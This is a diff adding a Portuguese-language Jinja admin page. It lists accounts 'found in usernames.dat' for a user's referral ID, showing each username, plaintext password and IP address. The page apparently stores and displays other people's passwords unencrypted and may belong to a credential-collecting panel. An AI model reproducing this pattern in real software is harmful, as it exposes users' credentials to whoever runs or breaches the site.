@@ -1,0 +1,54 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="mb-4">
+  <a class="text-sm text-zinc-400 hover:text-zinc-200" href="{{ url_for('admin.admin_users') }}">← Admin</a>
+</div>
+
+<div class="rounded-2xl border border-zinc-800 bg-zinc-900/20 p-6">
+  <div class="flex items-center justify-between">
+    <div>
+      <div class="text-sm text-zinc-400">Usuário</div>
+      <div class="text-xl font-semibold">{{ u.username }}</div>
+      <div class="text-sm mt-2">
+        Ref/ID: <span class="text-zinc-300">{{ u.id }}</span> •
+        Status:
+        {% if u.is_banned %}<span class="text-red-400">BANIDO</span>
+        {% else %}<span class="text-emerald-400">OK</span>{% endif %}
+      </div>
+    </div>
+  </div>
+
+  <div class="mt-6">
+    <h2 class="font-semibold mb-3">Contas encontradas no usernames.dat</h2>
+    <div class="overflow-x-auto">
+      <table class="w-full text-sm">
+        <thead class="text-zinc-400">
+          <tr class="border-b border-zinc-800">
+            <th class="text-left py-2">Data</th>
+            <th class="text-left py-2">Username</th>
+            <th class="text-left py-2">Password</th>
+            <th class="text-left py-2">Ref</th>
+            <th class="text-left py-2">IP</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for r in rows %}
+          <tr class="border-b border-zinc-900">
+            <td class="py-3 text-zinc-300">{{ r.ts_br }}</td>
+            <td class="py-3">{{ r.username }}</td>
+            <td class="py-3">{{ r.password }}</td>
+            <td class="py-3">{{ r.ref }}</td>
+            <td class="py-3 text-zinc-300">{{ r.ip }}</td>
+          </tr>
+          {% endfor %}
+          {% if rows|length == 0 %}
+          <tr>
+            <td colspan="5" class="py-6 text-center text-zinc-500">Nenhuma linha encontrada para esse Ref.</td>
+          </tr>
+          {% endif %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+{% endblock %}
